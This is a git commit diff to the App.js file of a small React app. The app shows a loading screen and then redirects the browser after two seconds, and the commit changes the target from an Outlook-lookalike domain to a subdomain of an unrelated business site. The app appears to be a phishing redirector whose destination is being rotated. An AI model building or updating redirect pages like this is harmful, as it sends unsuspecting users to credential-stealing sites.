92051bc05917cf45e179944f5296526ce3da147a
husknet <127146284+husknet@users.noreply.github.com>
2024-11-22 02:49:15 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.mercelotopia.com';
+            window.location.href = 'https://ss.materialesiluminacion.com.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
